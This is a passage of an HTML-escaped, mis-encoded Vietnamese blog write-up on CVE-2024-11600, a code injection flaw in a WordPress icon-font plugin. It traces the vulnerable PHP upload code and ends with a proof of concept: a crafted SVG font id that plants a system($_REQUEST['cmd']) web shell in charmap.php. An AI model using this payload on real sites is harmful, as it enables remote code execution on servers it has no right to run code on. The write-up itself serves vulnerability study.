Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;borderless-fonts&#39;&lt;/code&gt;: Menu slug&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;T∆∞∆°ng ·ª©ng tr√™n Admin Dashboard:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-06-cve-2024-11600/dashboard.png&#34; title=&#34;Menu tr√™n Admin Dashboard&#34; data-thumbnail=&#34;/posts/2025-12-06-cve-2024-11600/dashboard.png&#34; data-sub-html=&#34;&lt;h2&gt;Dashboard&lt;/h2&gt;&lt;p&gt;Menu tr√™n Admin Dashboard&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-06-cve-2024-11600/dashboard.png&#39; alt=&#34;Dashboard&#34; height=&#34;523&#34; width=&#34;1864&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Menu tr√™n Admin Dashboard&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;borderless_custom_icons_menu&#39;&lt;/code&gt;: Callback ƒë∆∞·ª£c g·ªçi khi truy c·∫≠p menu&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;function borderless_custom_icons_menu() {&#xA;    $Borderless_IF = new Borderless_IF;&#xA;    $Borderless_IF-&amp;gt;icon_pack_manager();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;T·∫°i ƒë√¢y, ƒë·ªëi t∆∞·ª£ng &lt;code&gt;Borderless_IF&lt;/code&gt; ƒë∆∞·ª£c t·∫°o:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Borderless_IF {&#xA;    function __construct() {&#xA;        $this-&amp;gt;paths            = wp_upload_dir();&#xA;        $this-&amp;gt;paths[&amp;#39;fonts&amp;#39;]   = &amp;#39;borderless_icon_fonts&amp;#39;;&#xA;        $this-&amp;gt;paths[&amp;#39;temp&amp;#39;]    = trailingslashit( $this-&amp;gt;paths[&amp;#39;fonts&amp;#39;] ) . &amp;#39;borderless_temp&amp;#39;;&#xA;        $this-&amp;gt;paths[&amp;#39;fontdir&amp;#39;] = trailingslashit( $this-&amp;gt;paths[&amp;#39;basedir&amp;#39;] ) . $this-&amp;gt;paths[&amp;#39;fonts&amp;#39;];&#xA;        $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] = trailingslashit( $this-&amp;gt;paths[&amp;#39;basedir&amp;#39;] ) . $this-&amp;gt;paths[&amp;#39;temp&amp;#39;];&#xA;        $this-&amp;gt;paths[&amp;#39;fonturl&amp;#39;] = set_url_scheme( trailingslashit( $this-&amp;gt;paths[&amp;#39;baseurl&amp;#39;] ) . $this-&amp;gt;paths[&amp;#39;fonts&amp;#39;] );&#xA;        $this-&amp;gt;paths[&amp;#39;tempurl&amp;#39;] = trailingslashit( $this-&amp;gt;paths[&amp;#39;baseurl&amp;#39;] ) . trailingslashit( $this-&amp;gt;paths[&amp;#39;temp&amp;#39;] );&#xA;        $this-&amp;gt;paths[&amp;#39;config&amp;#39;]  = &amp;#39;charmap.php&amp;#39;;&#xA;&#xA;        add_action( &amp;#39;wp_ajax_borderless_ajax_add_zipped_font&amp;#39;, array( $this, &amp;#39;add_zipped_font&amp;#39; ) );&#xA;        add_action( &amp;#39;wp_ajax_borderless_ajax_remove_zipped_font&amp;#39;, array( $this, &amp;#39;remove_zipped_font&amp;#39; ) );&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Construct kh·ªüi t·∫°o c√°c ƒë∆∞·ªùng d·∫´n v√† hook c·∫ßn thi·∫øt. H√†m &lt;code&gt;write_config&lt;/code&gt; s·ª≠ d·ª•ng ch√∫ng ƒë·ªÉ t·∫°o ƒë∆∞·ªùng d·∫´n ghi c·∫•u h√¨nh:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$charmap = $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] . &amp;#39;/&amp;#39; . $this-&amp;gt;paths[&amp;#39;config&amp;#39;];&#xA;&#xA;// &amp;lt;base_url&amp;gt;/wp-content/uploads/borderless_icon_fonts/borderless_temp/charmap.php&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;AJAX action &lt;code&gt;wp_ajax_borderless_ajax_add_zipped_font&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω ƒë·ªÉ x·ª≠ l√Ω vi·ªác upload v√† th√™m font t·ª´ file zip, v·ªõi callback &lt;code&gt;add_zipped_font&lt;/code&gt; ƒë∆∞·ª£c g·ªçi ƒë·ªÉ th·ª±c hi·ªán qu√° tr√¨nh gi·∫£i n√©n v√† ghi d·ªØ li·ªáu v√†o file c·∫•u h√¨nh.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function add_zipped_font() {&#xA;    $cap = apply_filters( &amp;#39;avf_file_upload_capability&amp;#39;, &amp;#39;update_plugins&amp;#39; );&#xA;    if ( ! current_user_can( $cap ) ) {&#xA;        die( esc_html__( &amp;#34;You do not have sufficient permissions to use this feature.&amp;#34;, &amp;#34;borderless&amp;#34; ) );&#xA;    }&#xA;    // Retrieve the file path of the zip file&#xA;    $attachment = $_POST[&amp;#39;values&amp;#39;];&#xA;    $path       = realpath( get_attached_file( sanitize_text_field( $attachment[&amp;#39;id&amp;#39;] ) ) );&#xA;    $unzipped   = $this-&amp;gt;zip_flatten( $path, array( &amp;#39;\.eot&amp;#39;, &amp;#39;\.svg&amp;#39;, &amp;#39;\.ttf&amp;#39;, &amp;#39;\.woff&amp;#39;, &amp;#39;\.json&amp;#39;, &amp;#39;\.css&amp;#39; ) );&#xA;    &#xA;    // If we managed to unzip the file and save it, extract the SVG file&#xA;    if ( $unzipped ) {&#xA;        $this-&amp;gt;create_config();&#xA;    }&#xA;    &#xA;    // If we did not get a name for the font, do not add it and remove the temp folder&#xA;    if ( $this-&amp;gt;ip_name == &amp;#39;unknown&amp;#39; ) {&#xA;        $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;        die( esc_html__( &amp;#39;Unable to retrieve the Icon Pack name from your uploaded folder.&amp;#39;, &amp;#39;borderless&amp;#39; ) );&#xA;    }&#xA;    die( esc_html__( &amp;#39;borderless_font_added:&amp;#39;, &amp;#39;borderless&amp;#39; ) . $this-&amp;gt;ip_name );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong h√†m &lt;code&gt;add_zipped_font()&lt;/code&gt;, sau khi ng∆∞·ªùi d√πng upload m·ªôt file zip ch·ª©a Icon Pack, plugin th·ª±c hi·ªán c√°c b∆∞·ªõc:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Ki·ªÉm tra quy·ªÅn &lt;code&gt;update_plugins&lt;/code&gt; =&amp;gt; ch·ªâ d√†nh cho Administrator.&lt;/li&gt;&#xA;&lt;li&gt;Unzip v√† ch·ªâ gi·ªØ l·∫°i c√°c file c·∫ßn thi·∫øt cho Icon Pack: font (&lt;code&gt;.eot&lt;/code&gt;, &lt;code&gt;.svg&lt;/code&gt;, &lt;code&gt;.ttf&lt;/code&gt;, &lt;code&gt;.woff&lt;/code&gt;), &lt;code&gt;JSON&lt;/code&gt;, &lt;code&gt;CSS&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;G·ªçi ƒë·∫øn &lt;code&gt;create_config()&lt;/code&gt; ƒë·ªÉ t·∫°o config file:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;function create_config() {&#xA;    $this-&amp;gt;json_file = $this-&amp;gt;find_json();&#xA;    $this-&amp;gt;svg_file  = $this-&amp;gt;find_svg();&#xA;    if ( empty( $this-&amp;gt;json_file ) || empty( $this-&amp;gt;svg_file ) ) {&#xA;        $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;        die( esc_html__( &amp;#39;SVG file or selection.json not found. Please check the integrity of the Icon Pack files.&amp;#39;, &amp;#39;borderless&amp;#39; ) );&#xA;    }&#xA;&#xA;    // Attempt to read the SVG file&#xA;    $response = wp_remote_fopen( trailingslashit( $this-&amp;gt;paths[&amp;#39;tempurl&amp;#39;] ) . $this-&amp;gt;svg_file );&#xA;    $json     = file_get_contents( trailingslashit( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] ) . $this-&amp;gt;json_file );&#xA;&#xA;    if ( empty( $response ) ) {&#xA;        $response = file_get_contents( trailingslashit( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] ) . $this-&amp;gt;svg_file );&#xA;    }&#xA;&#xA;    if ( ! is_wp_error( $json ) &amp;amp;&amp;amp; ! empty( $json ) ) {&#xA;        // Load and parse the SVG&#xA;        $xml       = simplexml_load_string( $response );&#xA;        $font_attr = $xml-&amp;gt;defs-&amp;gt;font-&amp;gt;attributes();&#xA;        $glyphs    = $xml-&amp;gt;defs-&amp;gt;font-&amp;gt;children();&#xA;&#xA;        // Sanitize the font name (ip_name)&#xA;        $this-&amp;gt;ip_name = (string) $font_attr[&amp;#39;id&amp;#39;];&#xA;        $this-&amp;gt;ip_name = sanitize_text_field( $this-&amp;gt;ip_name );&#xA;&#xA;        $font_folder = trailingslashit( $this-&amp;gt;paths[&amp;#39;fontdir&amp;#39;] ) . $this-&amp;gt;ip_name;&#xA;        if ( is_dir( $font_folder ) ) {&#xA;            $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;            die( esc_html__( &amp;#34;There is already an Icon Pack with this name. Please upload with another name.&amp;#34;, &amp;#34;borderless&amp;#34; ) );&#xA;        }&#xA;&#xA;        // Decode JSON content&#xA;        $file_contents = json_decode( $json );&#xA;        if ( ! isset( $file_contents-&amp;gt;IcoMoonType ) ) {&#xA;            $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;            die( esc_html__( &amp;#34;This Icon Pack is not an Icomoon pack. Use only Icomoon Icon Pack files.&amp;#34;, &amp;#39;borderless&amp;#39; ) );&#xA;        }&#xA;        &#xA;        // Iterate over icons to build $this-&amp;gt;json_config&#xA;        $icons = $file_contents-&amp;gt;icons;&#xA;        foreach ( $icons as $icon ) {&#xA;            // Sanitize each piece of data to prevent injection&#xA;            $raw_name   = isset( $icon-&amp;gt;properties-&amp;gt;name ) ? $icon-&amp;gt;properties-&amp;gt;name : &amp;#39;unknown&amp;#39;;&#xA;            $icon_name  = sanitize_text_field( $raw_name );&#xA;            &#xA;            // Create a &amp;#34;class&amp;#34; by removing spaces and sanitizing further&#xA;            $icon_class = str_replace( &amp;#39; &amp;#39;, &amp;#39;&amp;#39;, $icon_name );&#xA;            // Remove any other characters that are not typical in a CSS class&#xA;            $icon_class = preg_replace( &amp;#39;/[^A-Za-z0-9\-_]/&amp;#39;, &amp;#39;&amp;#39;, $icon_class );&#xA;            &#xA;            $raw_tags   = isset( $icon-&amp;gt;icon-&amp;gt;tags ) ? $icon-&amp;gt;icon-&amp;gt;tags : array();&#xA;            // Sanitize each tag&#xA;            $safe_tags  = array_map( &amp;#39;sanitize_text_field&amp;#39;, $raw_tags );&#xA;            $tags       = implode( &amp;#34;,&amp;#34;, $safe_tags );&#xA;            &#xA;            $this-&amp;gt;json_config[ $this-&amp;gt;ip_name ][ $icon_name ] = array(&#xA;                &amp;#34;class&amp;#34; =&amp;gt; $icon_class,&#xA;                &amp;#34;tags&amp;#34;  =&amp;gt; $tags&#xA;            );&#xA;        }&#xA;&#xA;        if ( ! empty( $this-&amp;gt;json_config ) &amp;amp;&amp;amp; $this-&amp;gt;ip_name != &amp;#39;unknown&amp;#39; ) {&#xA;            $this-&amp;gt;write_config();&#xA;            $this-&amp;gt;re_write_css();&#xA;            $this-&amp;gt;rename_files();&#xA;            $this-&amp;gt;rename_folder();&#xA;            $this-&amp;gt;add_font();&#xA;        }&#xA;    }&#xA;&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y l√† &lt;strong&gt;tr√°i tim&lt;/strong&gt; c·ªßa qu√° tr√¨nh th√™m Icon Pack. N√≥ ch·ªãu tr√°ch nhi·ªám ƒë·ªçc d·ªØ li·ªáu t·ª´ file SVG v√† JSON, sau ƒë√≥ sinh ra c·∫•u h√¨nh icon ƒë·ªÉ plugin s·ª≠ d·ª•ng.&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Ki·ªÉm tra file c·∫ßn thi·∫øt&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;json_file = $this-&amp;gt;find_json();&#xA;$this-&amp;gt;svg_file  = $this-&amp;gt;find_svg();&#xA;if ( empty( $this-&amp;gt;json_file ) || empty( $this-&amp;gt;svg_file ) ) {&#xA;    $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;    die( esc_html__( &amp;#39;SVG file or selection.json not found...&amp;#39;, &amp;#39;borderless&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Plugin t√¨m file &lt;code&gt;.json&lt;/code&gt; v√† file font &lt;code&gt;.svg&lt;/code&gt; trong th∆∞ m·ª•c t·∫°m.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu thi·∫øu m·ªôt trong hai, qu√° tr√¨nh b·ªã h·ªßy.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;ƒê·ªçc n·ªôi dung SVG v√† JSON&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$response = wp_remote_fopen( trailingslashit( $this-&amp;gt;paths[&amp;#39;tempurl&amp;#39;] ) . $this-&amp;gt;svg_file );&#xA;$json     = file_get_contents( trailingslashit( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] ) . $this-&amp;gt;json_file );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;D√πng &lt;code&gt;wp_remote_fopen&lt;/code&gt; ƒë·ªÉ ƒë·ªçc SVG qua URL, fallback sang &lt;code&gt;file_get_contents&lt;/code&gt; n·∫øu th·∫•t b·∫°i.&lt;/li&gt;&#xA;&lt;li&gt;ƒê·ªçc JSON tr·ª±c ti·∫øp t·ª´ th∆∞ m·ª•c t·∫°m.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Parse SVG ƒë·ªÉ l·∫•y t√™n font&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$xml       = simplexml_load_string( $response );&#xA;$font_attr = $xml-&amp;gt;defs-&amp;gt;font-&amp;gt;attributes();&#xA;$this-&amp;gt;ip_name = (string) $font_attr[&amp;#39;id&amp;#39;];&#xA;$this-&amp;gt;ip_name = sanitize_text_field( $this-&amp;gt;ip_name );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;L·∫•y thu·ªôc t√≠nh &lt;code&gt;id&lt;/code&gt; c·ªßa &lt;code&gt;&amp;lt;font&amp;gt;&lt;/code&gt; l√†m t√™n font (&lt;code&gt;ip_name&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;Ch·ªâ l·ªçc b·∫±ng &lt;code&gt;sanitize_text_field&lt;/code&gt; ‚Üí ƒë√¢y ch√≠nh l√† ƒëi·ªÉm y·∫øu, v√¨ h√†m n√†y kh√¥ng lo·∫°i b·ªè k√Ω t·ª± nguy hi·ªÉm trong ng·ªØ c·∫£nh file PHP.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Ki·ªÉm tra tr√πng t√™n&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$font_folder = trailingslashit( $this-&amp;gt;paths[&amp;#39;fontdir&amp;#39;] ) . $this-&amp;gt;ip_name;&#xA;if ( is_dir( $font_folder ) ) {&#xA;    $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;    die( esc_html__( &amp;#34;There is already an Icon Pack with this name...&amp;#34;, &amp;#34;borderless&amp;#34; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu th∆∞ m·ª•c font v·ªõi t√™n ƒë√≥ ƒë√£ t·ªìn t·∫°i, qu√° tr√¨nh b·ªã h·ªßy.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Parse JSON ƒë·ªÉ l·∫•y danh s√°ch icon&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$file_contents = json_decode( $json );&#xA;if ( ! isset( $file_contents-&amp;gt;IcoMoonType ) ) {&#xA;    $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;    die( esc_html__( &amp;#34;This Icon Pack is not an Icomoon pack...&amp;#34;, &amp;#39;borderless&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;ƒê·∫£m b·∫£o JSON l√† pack IcoMoon h·ª£p l·ªá.&lt;/li&gt;&#xA;&lt;li&gt;L·∫∑p qua danh s√°ch icon, sanitize t√™n, class, tags r·ªìi ƒë∆∞a v√†o &lt;code&gt;$this-&amp;gt;json_config&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;Sinh c·∫•u h√¨nh v√† ghi file&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! empty( $this-&amp;gt;json_config ) &amp;amp;&amp;amp; $this-&amp;gt;ip_name != &amp;#39;unknown&amp;#39; ) {&#xA;    $this-&amp;gt;write_config();&#xA;    $this-&amp;gt;re_write_css();&#xA;    $this-&amp;gt;rename_files();&#xA;    $this-&amp;gt;rename_folder();&#xA;    $this-&amp;gt;add_font();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu d·ªØ li·ªáu h·ª£p l·ªá, plugin s·∫Ω:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ghi file &lt;code&gt;charmap.php&lt;/code&gt; ch·ª©a m·∫£ng &lt;code&gt;$icons&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Sinh l·∫°i CSS.&lt;/li&gt;&#xA;&lt;li&gt;ƒê·ªïi t√™n file v√† th∆∞ m·ª•c.&lt;/li&gt;&#xA;&lt;li&gt;Th√™m font pack v√†o h·ªá th·ªëng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;File JSON v√† SVG y√™u c·∫ßu s·∫Ω c√≥ d·∫°ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;IcoMoonType&amp;#34;: &amp;#34;selection&amp;#34;,&#xA;  &amp;#34;icons&amp;#34;: [&#xA;    {&#xA;      &amp;#34;properties&amp;#34;: {&#xA;        &amp;#34;name&amp;#34;: &amp;#34;home&amp;#34;&#xA;      },&#xA;      &amp;#34;icon&amp;#34;: {&#xA;        &amp;#34;tags&amp;#34;: [&amp;#34;house&amp;#34;, &amp;#34;main&amp;#34;]&#xA;      }&#xA;    }&#xA;  ]&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; standalone=&amp;#34;no&amp;#34;?&amp;gt;&#xA;&amp;lt;!DOCTYPE svg PUBLIC &amp;#34;-//W3C//DTD SVG 1.1//EN&amp;#34;&#xA;  &amp;#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&amp;#34;&amp;gt;&#xA;&amp;lt;svg xmlns=&amp;#34;http://www.w3.org/2000/svg&amp;#34;&amp;gt;&#xA;  &amp;lt;defs&amp;gt;&#xA;    &amp;lt;font id=&amp;#34;id&amp;#34; horiz-adv-x=&amp;#34;1024&amp;#34;&amp;gt;&#xA;      &amp;lt;font-face font-family=&amp;#34;icomoon&amp;#34; units-per-em=&amp;#34;1024&amp;#34; ascent=&amp;#34;960&amp;#34; descent=&amp;#34;-64&amp;#34;/&amp;gt;&#xA;      &amp;lt;glyph unicode=&amp;#34;&amp;amp;#xe900;&amp;#34; glyph-name=&amp;#34;home&amp;#34; d=&amp;#34;M512 128L128 512h128v320h192V640h128v192h192V512h128z&amp;#34;/&amp;gt;&#xA;    &amp;lt;/font&amp;gt;&#xA;  &amp;lt;/defs&amp;gt;&#xA;&amp;lt;/svg&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Attacker with Administrator privilege&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Uploads a ZIP file containing an Icon Pack (SVG &amp;#43; JSON)&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;AJAX call: borderless_ajax_add_zipped_font&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;zip_flatten() extracts files into /uploads/borderless_icon_fonts/borderless_temp/&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;create_config() is executed&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Reads the SVG file&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;Extracts font id=... as ip_name&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;sanitize_text_field(ip_name) (dangerous characters not removed)&amp;#34;]&#xA;&#xA;E --&amp;gt; I[&amp;#34;Reads JSON file&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Builds $this-&amp;gt;json_config array&amp;#34;]&#xA;&#xA;H &amp;amp; J --&amp;gt; K[&amp;#34;write_config() writes data into charmap.php&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Injected payload is embedded into PHP code&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;charmap.php now contains malicious PHP&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;Server loads/includes charmap.php&amp;#34;]&#xA;N --&amp;gt; O[&amp;#34;Remote Code Execution (RCE)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o ZIP file ch·ª©a &lt;code&gt;rce.json&lt;/code&gt; v√† &lt;code&gt;rce.svg&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;IcoMoonType&amp;#34;: &amp;#34;selection&amp;#34;,&#xA;  &amp;#34;icons&amp;#34;: [&#xA;    {&#xA;      &amp;#34;properties&amp;#34;: {&#xA;        &amp;#34;name&amp;#34;: &amp;#34;home&amp;#34;&#xA;      },&#xA;      &amp;#34;icon&amp;#34;: {&#xA;        &amp;#34;tags&amp;#34;: [&amp;#34;house&amp;#34;, &amp;#34;main&amp;#34;]&#xA;      }&#xA;    }&#xA;  ]&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; standalone=&amp;#34;no&amp;#34;?&amp;gt;&#xA;&amp;lt;!DOCTYPE svg PUBLIC &amp;#34;-//W3C//DTD SVG 1.1//EN&amp;#34;&#xA;  &amp;#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&amp;#34;&amp;gt;&#xA;&amp;lt;svg xmlns=&amp;#34;http://www.w3.org/2000/svg&amp;#34;&amp;gt;&#xA;  &amp;lt;defs&amp;gt;&#xA;    &amp;lt;font id=&amp;#34;&amp;#39;];system($_REQUEST[&amp;#39;cmd&amp;#39;]);//&amp;#34; horiz-adv-x=&amp;#34;1024&amp;#34;&amp;gt;&#xA;      &amp;lt;font-face font-family=&amp;#34;icomoon&amp;#34; units-per-em=&amp;#34;1024&amp;#34; ascent=&amp;#34;960&amp;#34; descent=&amp;#34;-64&amp;#34;/&amp;gt;&#xA;      &amp;lt;glyph unicode=&amp;#34;&amp;amp;#xe900;&amp;#34; glyph-name=&amp;#34;home&amp;#34; d=&amp;#34;M512 128L128 512h128v320h192V640h128v192h192V512h128z&amp;#34;/&amp;gt;&#xA;    &amp;lt;/font&amp;gt;&#xA;  &amp;lt;/defs&amp;gt;&#xA;&amp;lt;/svg&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;D√πng Administrator account upload ZIP file l√™n t·∫°i endpoint:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;http://localhost/wp-admin/admin.php?page=borderless-fonts&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-06-cve-2024-11600/upload.png&#34; title=&#34;File ƒë∆∞·ª£c upload&#34; data-thumbnail=&#34;/posts/2025-12-06-cve-2024-11600/upload.png&#34; data-sub-html=&#34;&lt;h2&gt;Uploaded&lt;/h2&gt;&lt;p&gt;File ƒë∆∞·ª£c upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-06-cve-2024-11600/upload.png&#39; alt=&#34;Uploaded&#34; height=&#34;152&#34; width=&#34;1099&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;File ƒë∆∞·ª£c upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;RCE&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-06-cve-2024-11600/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2025-12-06-cve-2024-11600/result.png&#34; 